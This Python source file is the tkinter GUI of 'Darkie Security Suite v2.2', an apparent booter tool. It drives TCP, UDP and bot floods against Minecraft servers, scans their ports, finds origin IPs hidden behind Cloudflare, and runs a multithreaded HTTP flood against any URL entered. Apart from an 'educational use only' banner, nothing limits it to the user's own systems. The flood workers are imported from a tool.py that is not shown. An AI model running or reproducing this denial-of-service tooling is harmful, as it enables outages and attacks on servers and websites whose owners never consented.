#!/usr/bin/env python3
"""
Darkie Security Suite v2.2 — GUI (tkinter)
Educational use only. Test only systems you own.
"""

import io
import os
import sys
import socket
import struct
import random
import threading
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, scrolledtext, filedialog
except ImportError:
    print("tkinter not found. Install: apt install python3-tk")
    sys.exit(1)

try:
    import requests
except ImportError:
    requests = None

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from tool import (
    _mc_varint, _mc_pstr, _mc_packet, _mc_read_varint, _mc_build_handshake, _mc_build_login,
    mc_tcp_flood_worker, mc_udp_flood_worker, _mc_bot_worker,
    mc_find_ports, find_real_ip, legacy_resolve,
    MINECRAFT_PORTS, MC_PORT_RANGES,
)

BG = "#1a1a2e"
BG2 = "#16213e"
FG = "#e94560"
FG2 = "#0f3460"
ACCENT = "#533483"
TEXT = "#eee"
DIM = "#888"
GREEN = "#00ff88"
RED = "#ff4444"
YELLOW = "#ffaa00"
CYAN = "#00ccff"


class DarkieGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Darkie Security Suite v2.2")
        self.root.geometry("900x700")
        self.root.configure(bg=BG)
        self.root.minsize(800, 600)

        self.stop_event = threading.Event()

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BG2, foreground=TEXT, padding=[12, 6], font=("Consolas", 10, "bold"))
        style.map("TNotebook.Tab", background=[("selected", ACCENT)], foreground=[("selected", FG)])
        style.configure("TFrame", background=BG)
        style.configure("TLabel", background=BG, foreground=TEXT, font=("Consolas", 10))
        style.configure("TButton", background=ACCENT, foreground=TEXT, font=("Consolas", 10, "bold"), padding=[10, 5])
        style.map("TButton", background=[("active", FG)])
        style.configure("TEntry", fieldcolor=BG2, foreground=TEXT, insertcolor=TEXT, font=("Consolas", 11))
        style.configure("TCombobox", fieldcolor=BG2, foreground=TEXT, font=("Consolas", 10))
        style.configure("TRadiobutton", background=BG, foreground=TEXT, font=("Consolas", 10))
        style.map("TRadiobutton", background=[("active", BG)])
        style.configure("TSpinbox", fieldcolor=BG2, foreground=TEXT, font=("Consolas", 10))
        style.configure("Horizontal.TProgressbar", background=GREEN, troughcolor=BG2)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.tabs = {}
        for name in ["MC Stress", "Port Scanner", "Real IP", "Web Stress", "Log"]:
            frame = ttk.Frame(self.notebook)
            self.notebook.add(frame, text=f" {name} ")
            self.tabs[name] = frame

        self._build_mc_tab()
        self._build_port_tab()
        self._build_realip_tab()
        self._build_web_tab()
        self._build_log_tab()

        self.log("Darkie Security Suite v2.2 GUI initialized")
        self.log("Educational use only — test only systems you own")

    def log(self, msg, tag="info"):
        log_widget = self.tabs["Log"].log_text
        log_widget.configure(state=tk.NORMAL)
        ts = time.strftime("%H:%M:%S")
        if tag == "error":
            log_widget.insert(tk.END, f"[{ts}] [!] {msg}\n", "error")
        elif tag == "success":
            log_widget.insert(tk.END, f"[{ts}] [+] {msg}\n", "success")
        elif tag == "warn":
            log_widget.insert(tk.END, f"[{ts}] [~] {msg}\n", "warn")
        else:
            log_widget.insert(tk.END, f"[*] {msg}\n", "info")
        log_widget.see(tk.END)
        log_widget.configure(state=tk.DISABLED)

    def _make_entry(self, parent, label, default="", row=0, col=0):
        ttk.Label(parent, text=label).grid(row=row, column=col, sticky="w", padx=5, pady=3)
        var = tk.StringVar(value=default)
        entry = ttk.Entry(parent, textvariable=var, width=35)
        entry.grid(row=row, column=col+1, sticky="ew", padx=5, pady=3)
        return var

    def _make_int_entry(self, parent, label, default=0, row=0, col=0):
        ttk.Label(parent, text=label).grid(row=row, column=col, sticky="w", padx=5, pady=3)
        var = tk.IntVar(value=default)
        entry = ttk.Entry(parent, textvariable=var, width=15)
        entry.grid(row=row, column=col+1, sticky="ew", padx=5, pady=3)
        return var

    # ── MC Stress Tab ──
    def _build_mc_tab(self):
        f = self.tabs["MC Stress"]
        f.columnconfigure(1, weight=1)

        ttk.Label(f, text="Minecraft Stress Test", font=("Consolas", 14, "bold"), foreground=FG).grid(row=0, column=0, columnspan=4, pady=10)

        self.mc_ip = self._make_entry(f, "Server IP/Domain:", "", 1, 0)
        self.mc_port = self._make_int_entry(f, "Port:", 25565, 1, 2)

        self.mc_scan_btn = ttk.Button(f, text="Scan Ports", command=self._mc_scan_ports)
        self.mc_scan_btn.grid(row=1, column=3, padx=5, pady=3)

        self.mc_ports_label = ttk.Label(f, text="Ports: (click Scan)", foreground=DIM)
        self.mc_ports_label.grid(row=2, column=0, columnspan=4, sticky="w", padx=5)

        type_frame = ttk.Frame(f)
        type_frame.grid(row=3, column=0, columnspan=4, sticky="w", padx=5, pady=5)
        ttk.Label(type_frame, text="Type:").pack(side=tk.LEFT, padx=(0, 10))
        self.mc_type = tk.StringVar(value="rapid_tcp")
        for val, txt in [("rapid_tcp", "Rapid TCP"), ("sustained_tcp", "Sustained TCP"), ("udp", "UDP Bedrock"), ("bots", "Mineflayer Bots")]:
            ttk.Radiobutton(type_frame, text=txt, variable=self.mc_type, value=val).pack(side=tk.LEFT, padx=5)

        self.mc_dur = self._make_int_entry(f, "Duration (s):", 30, 4, 0)
        self.mc_conns = self._make_int_entry(f, "Connections:", 500, 4, 2)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=5, column=0, columnspan=4, pady=10)
        self.mc_start_btn = ttk.Button(btn_frame, text="START", command=self._mc_start)
        self.mc_start_btn.pack(side=tk.LEFT, padx=5)
        self.mc_stop_btn = ttk.Button(btn_frame, text="STOP", command=self._mc_stop, state=tk.DISABLED)
        self.mc_stop_btn.pack(side=tk.LEFT, padx=5)

        self.mc_progress = ttk.Progressbar(f, mode="determinate", maximum=100)
        self.mc_progress.grid(row=6, column=0, columnspan=4, sticky="ew", padx=10, pady=5)

        self.mc_status = ttk.Label(f, text="Ready", foreground=GREEN)
        self.mc_status.grid(row=7, column=0, columnspan=4, sticky="w", padx=5)

    def _mc_scan_ports(self):
        ip = self.mc_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Enter an IP or domain first")
            return
        self.log(f"Scanning MC ports on {ip}...")
        self.mc_ports_label.configure(text="Scanning...", foreground=YELLOW)

        def _scan():
            try:
                resolved = legacy_resolve(ip)
                if not resolved:
                    self.root.after(0, lambda: self.mc_ports_label.configure(text="Could not resolve", foreground=RED))
                    return
                ports = mc_find_ports(resolved, verbose=False)
                port_str = ", ".join(str(p) for p in ports) if ports else "none found"
                self.root.after(0, lambda: self.mc_ports_label.configure(text=f"Found: {port_str}", foreground=GREEN))
                self.log(f"Found MC ports: {port_str}", "success")
            except Exception as e:
                self.root.after(0, lambda: self.mc_ports_label.configure(text=f"Error: {e}", foreground=RED))

        threading.Thread(target=_scan, daemon=True).start()

    def _mc_start(self):
        ip = self.mc_ip.get().strip()
        port = self.mc_port.get()
        dur = self.mc_dur.get()
        conns = self.mc_conns.get()
        mc_type = self.mc_type.get()

        if not ip:
            messagebox.showerror("Error", "Enter a target IP/domain")
            return

        self.stop_event.clear()
        self.mc_start_btn.configure(state=tk.DISABLED)
        self.mc_stop_btn.configure(state=tk.NORMAL)
        self.mc_status.configure(text="Running...", foreground=YELLOW)
        self.mc_progress["value"] = 0

        self.log(f"Starting MC stress: {ip}:{port} ({mc_type}, {conns} conns, {dur}s)")

        def _run():
            try:
                resolved = legacy_resolve(ip)
                if not resolved:
                    self.root.after(0, lambda: self.mc_status.configure(text="Could not resolve target", foreground=RED))
                    return

                if mc_type == "bots":
                    bot_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mc_bots.js")
                    if os.path.exists(bot_script):
                        proc = subprocess.Popen(["node", bot_script, resolved, str(port), str(conns), str(dur)],
                                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                        for line in iter(proc.stdout.readline, ''):
                            if self.stop_event.is_set():
                                proc.terminate()
                                break
                            if line.strip():
                                self.root.after(0, lambda l=line.strip(): self.log(f"[Bot] {l}", "info"))
                        proc.wait()
                    else:
                        self.log("mc_bots.js not found, using raw TCP bots", "warn")
                        br = {}
                        workers = conns
                        with ThreadPoolExecutor(max_workers=workers) as ex:
                            fs = {ex.submit(_mc_bot_worker, resolved, port, br, i): i for i in range(workers)}
                            for f in as_completed(fs):
                                if self.stop_event.is_set():
                                    break
                                try: f.result()
                                except: pass
                else:
                    if mc_type == "udp":
                        br = {}
                        workers = conns
                        start_t = time.time()
                        with ThreadPoolExecutor(max_workers=workers) as ex:
                            fs = {ex.submit(mc_udp_flood_worker, resolved, 19132, dur, br, i): i for i in range(workers)}
                            while not all(f.done() for f in fs) and not self.stop_event.is_set():
                                elapsed = time.time() - start_t
                                total = sum(v[0] if isinstance(v, tuple) else (v or 0) for v in br.values())
                                errors = sum(v[1] if isinstance(v, tuple) else 0 for v in br.values())
                                pct = min(elapsed / dur * 100, 100) if dur > 0 else 100
                                self.root.after(0, lambda t=total, e=errors, el=elapsed, p=pct: (
                                    self.mc_progress.configure(value=p),
                                    self.mc_status.configure(text=f"UDP: S:{t:,} E:{e:,} | {t/max(el,0.1):.0f}/s | {el:.0f}s/{dur}s")
                                ))
                                time.sleep(0.5)
                    else:
                        mode = "rapid" if mc_type == "rapid_tcp" else "sustained"
                        br = {}
                        workers = conns
                        start_t = time.time()
                        with ThreadPoolExecutor(max_workers=workers) as ex:
                            fs = {ex.submit(mc_tcp_flood_worker, resolved, port, dur, br, i, mode): i for i in range(workers)}
                            while not all(f.done() for f in fs) and not self.stop_event.is_set():
                                elapsed = time.time() - start_t
                                total = sum(v[0] if isinstance(v, tuple) else (v or 0) for v in br.values())
                                errors = sum(v[1] if isinstance(v, tuple) else 0 for v in br.values())
                                pct = min(elapsed / dur * 100, 100) if dur > 0 else 100
                                self.root.after(0, lambda t=total, e=errors, el=elapsed, p=pct: (
                                    self.mc_progress.configure(value=p),
                                    self.mc_status.configure(text=f"TCP: S:{t:,} E:{e:,} | {t/max(el,0.1):.0f}/s | {el:.0f}s/{dur}s")
                                ))
                                time.sleep(0.5)

                self.root.after(0, lambda: (
                    self.mc_progress.configure(value=100),
                    self.mc_status.configure(text="Complete", foreground=GREEN),
                    self.mc_start_btn.configure(state=tk.NORMAL),
                    self.mc_stop_btn.configure(state=tk.DISABLED),
                    self.log("MC stress test complete", "success")
                ))
            except Exception as e:
                self.root.after(0, lambda: (
                    self.mc_status.configure(text=f"Error: {e}", foreground=RED),
                    self.mc_start_btn.configure(state=tk.NORMAL),
                    self.mc_stop_btn.configure(state=tk.DISABLED)
                ))
                self.log(f"MC stress error: {e}", "error")

        threading.Thread(target=_run, daemon=True).start()

    def _mc_stop(self):
        self.stop_event.set()
        self.mc_status.configure(text="Stopping...", foreground=YELLOW)
        self.log("MC stress test stopped by user", "warn")

    # ── Port Scanner Tab ──
    def _build_port_tab(self):
        f = self.tabs["Port Scanner"]
        f.columnconfigure(1, weight=1)

        ttk.Label(f, text="Minecraft Port Scanner", font=("Consolas", 14, "bold"), foreground=FG).grid(row=0, column=0, columnspan=4, pady=10)
        ttk.Label(f, text="Works with Pterodactyl/containerized servers (probes 70+ MC ports directly)").grid(row=1, column=0, columnspan=4, pady=2)

        self.ps_ip = self._make_entry(f, "Target IP/Domain:", "", 2, 0)
        self.ps_btn = ttk.Button(f, text="Scan", command=self._ps_scan)
        self.ps_btn.grid(row=2, column=2, padx=5)

        self.ps_result = scrolledtext.ScrolledText(f, height=20, bg=BG2, fg=TEXT, font=("Consolas", 10), insertbackground=TEXT, state=tk.DISABLED)
        self.ps_result.grid(row=3, column=0, columnspan=4, sticky="nsew", padx=10, pady=10)
        f.rowconfigure(3, weight=1)

    def _ps_scan(self):
        ip = self.ps_ip.get().strip()
        if not ip:
            messagebox.showerror("Error", "Enter a target")
            return

        self.ps_btn.configure(state=tk.DISABLED)
        self._ps_clear()

        def _scan():
            try:
                resolved = legacy_resolve(ip)
                if not resolved:
                    self.root.after(0, lambda: self._ps_append("Could not resolve target\n"))
                    return
                self.root.after(0, lambda: self._ps_append(f"Target: {resolved}\nScanning 70+ Minecraft ports...\n\n"))

                open_ports = mc_find_ports(resolved, verbose=False)

                result = ""
                if open_ports:
                    result += "OPEN MINECRAFT PORTS:\n"
                    result += "=" * 40 + "\n"
                    for p in open_ports:
                        svc = "Minecraft" if p in MINECRAFT_PORTS else "MC Alt"
                        result += f"  {p:>6}  {svc}\n"
                    result += f"\nTotal: {len(open_ports)} open ports\n"
                else:
                    result += "No Minecraft ports detected.\n"
                    result += "Possible reasons:\n"
                    result += "  - Server is offline\n"
                    result += "  - Ports are custom (enter manually)\n"
                    result += "  - Firewall blocking probes\n"

                self.root.after(0, lambda: self._ps_append(result))
            except Exception as e:
                self.root.after(0, lambda: self._ps_append(f"Error: {e}\n"))
            finally:
                self.root.after(0, lambda: self.ps_btn.configure(state=tk.NORMAL))

        threading.Thread(target=_scan, daemon=True).start()

    def _ps_clear(self):
        self.ps_result.configure(state=tk.NORMAL)
        self.ps_result.delete("1.0", tk.END)
        self.ps_result.configure(state=tk.DISABLED)

    def _ps_append(self, text):
        self.ps_result.configure(state=tk.NORMAL)
        self.ps_result.insert(tk.END, text)
        self.ps_result.see(tk.END)
        self.ps_result.configure(state=tk.DISABLED)

    # ── Real IP Tab ──
    def _build_realip_tab(self):
        f = self.tabs["Real IP"]
        f.columnconfigure(1, weight=1)

        ttk.Label(f, text="Real Origin IP Finder", font=("Consolas", 14, "bold"), foreground=FG).grid(row=0, column=0, columnspan=4, pady=10)
        ttk.Label(f, text="Bypasses Cloudflare — finds real server IP via DNS/MX/TXT/NS records").grid(row=1, column=0, columnspan=4, pady=2)

        self.ri_domain = self._make_entry(f, "Domain:", "", 2, 0)
        self.ri_btn = ttk.Button(f, text="Find Real IP", command=self._ri_find)
        self.ri_btn.grid(row=2, column=2, padx=5)

        self.ri_result = scrolledtext.ScrolledText(f, height=20, bg=BG2, fg=TEXT, font=("Consolas", 10), insertbackground=TEXT, state=tk.DISABLED)
        self.ri_result.grid(row=3, column=0, columnspan=4, sticky="nsew", padx=10, pady=10)
        f.rowconfigure(3, weight=1)

    def _ri_find(self):
        domain = self.ri_domain.get().strip()
        if not domain:
            messagebox.showerror("Error", "Enter a domain")
            return

        self.ri_btn.configure(state=tk.DISABLED)
        self._ri_clear()

        old_stdout = sys.stdout
        sys.stdout = io.StringIO()

        def _find():
            try:
                result = find_real_ip(domain)
                output = sys.stdout.getvalue()
                sys.stdout = old_stdout
                self.root.after(0, lambda: self._ri_append(output))
                if result:
                    self.root.after(0, lambda: self._ri_append(f"\n>>> REAL IP: {result}\n"))
            except Exception as e:
                sys.stdout = old_stdout
                self.root.after(0, lambda: self._ri_append(f"Error: {e}\n"))
            finally:
                self.root.after(0, lambda: self.ri_btn.configure(state=tk.NORMAL))

        threading.Thread(target=_find, daemon=True).start()

    def _ri_clear(self):
        self.ri_result.configure(state=tk.NORMAL)
        self.ri_result.delete("1.0", tk.END)
        self.ri_result.configure(state=tk.DISABLED)

    def _ri_append(self, text):
        self.ri_result.configure(state=tk.NORMAL)
        self.ri_result.insert(tk.END, text)
        self.ri_result.see(tk.END)
        self.ri_result.configure(state=tk.DISABLED)

    # ── Web Stress Tab ──
    def _build_web_tab(self):
        f = self.tabs["Web Stress"]
        f.columnconfigure(1, weight=1)

        ttk.Label(f, text="Web Stress Test", font=("Consolas", 14, "bold"), foreground=FG).grid(row=0, column=0, columnspan=4, pady=10)

        self.ws_url = self._make_entry(f, "URL:", "http://", 1, 0)
        self.ws_reqs = self._make_int_entry(f, "Requests:", 500, 2, 0)
        self.ws_threads = self._make_int_entry(f, "Threads:", 100, 2, 2)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=3, column=0, columnspan=4, pady=10)
        self.ws_start_btn = ttk.Button(btn_frame, text="START", command=self._ws_start)
        self.ws_start_btn.pack(side=tk.LEFT, padx=5)
        self.ws_stop_btn = ttk.Button(btn_frame, text="STOP", command=self._ws_stop, state=tk.DISABLED)
        self.ws_stop_btn.pack(side=tk.LEFT, padx=5)

        self.ws_progress = ttk.Progressbar(f, mode="determinate", maximum=100)
        self.ws_progress.grid(row=4, column=0, columnspan=4, sticky="ew", padx=10, pady=5)

        self.ws_status = ttk.Label(f, text="Ready", foreground=GREEN)
        self.ws_status.grid(row=5, column=0, columnspan=4, sticky="w", padx=5)

    def _ws_start(self):
        url = self.ws_url.get().strip()
        if not url or not url.startswith("http"):
            messagebox.showerror("Error", "Enter a valid URL (http://...)")
            return

        num = self.ws_reqs.get()
        threads = self.ws_threads.get()
        self.stop_event.clear()
        self.ws_start_btn.configure(state=tk.DISABLED)
        self.ws_stop_btn.configure(state=tk.NORMAL)
        self.ws_status.configure(text="Running...", foreground=YELLOW)

        def _run():
            try:
                ok = 0; err = 0; done = 0
                start = time.time()
                batch_size = threads * 4
                with requests.Session() as sess:
                    for b in range(0, num, batch_size):
                        if self.stop_event.is_set(): break
                        be = min(b + batch_size, num)
                        br = {}
                        with ThreadPoolExecutor(max_workers=threads) as ex:
                            fs = {ex.submit(self._ws_req, sess, url, br, i): i for i in range(b, be)}
                            for f in as_completed(fs):
                                try: f.result()
                                except: pass
                        for v in br.values():
                            ok += v; err += 1 - v; done += 1
                        pct = done / num * 100
                        elapsed = time.time() - start
                        rate = done / max(elapsed, 0.01)
                        self.root.after(0, lambda p=pct, o=ok, e=err, r=rate, el=elapsed: (
                            self.ws_progress.configure(value=p),
                            self.ws_status.configure(text=f"OK: {o} | Err: {e} | {r:.0f}/s | {el:.1f}s")
                        ))

                self.root.after(0, lambda: (
                    self.ws_progress.configure(value=100),
                    self.ws_status.configure(text=f"Complete: {ok} OK, {err} errors", foreground=GREEN),
                    self.ws_start_btn.configure(state=tk.NORMAL),
                    self.ws_stop_btn.configure(state=tk.DISABLED)
                ))
            except Exception as e:
                self.root.after(0, lambda: (
                    self.ws_status.configure(text=f"Error: {e}", foreground=RED),
                    self.ws_start_btn.configure(state=tk.NORMAL),
                    self.ws_stop_btn.configure(state=tk.DISABLED)
                ))

        threading.Thread(target=_run, daemon=True).start()

    def _ws_req(self, sess, url, results, idx):
        try:
            r = sess.get(url, timeout=8, verify=False)
            results[idx] = 1 if r.status_code < 500 else 0
        except:
            results[idx] = 0

    def _ws_stop(self):
        self.stop_event.set()

    # ── Log Tab ──
    def _build_log_tab(self):
        f = self.tabs["Log"]
        f.rowconfigure(0, weight=1)
        f.columnconfigure(0, weight=1)

        self.log_text = scrolledtext.ScrolledText(f, bg=BG2, fg=TEXT, font=("Consolas", 10), insertbackground=TEXT, state=tk.DISABLED)
        self.log_text.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        self.log_text.tag_configure("error", foreground=RED)
        self.log_text.tag_configure("success", foreground=GREEN)
        self.log_text.tag_configure("warn", foreground=YELLOW)
        self.log_text.tag_configure("info", foreground=CYAN)

        clear_btn = ttk.Button(f, text="Clear Log", command=lambda: (self.log_text.configure(state=tk.NORMAL), self.log_text.delete("1.0", tk.END), self.log_text.configure(state=tk.DISABLED)))
        clear_btn.grid(row=1, column=0, pady=5)


def main():
    try:
        root = tk.Tk()
        root.withdraw()
        root.update()
        root.deiconify()
    except tk.TclError:
        print()
        print("  ╔══════════════════════════════════════════════════╗")
        print("  ║  No display detected (headless environment).    ║")
        print("  ║  Launching CLI mode instead...                  ║")
        print("  ╚══════════════════════════════════════════════════╝")
        print()
        os.execvp("python3", ["python3", os.path.join(os.path.dirname(__file__), "tool.py")])
        return

    app = DarkieGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
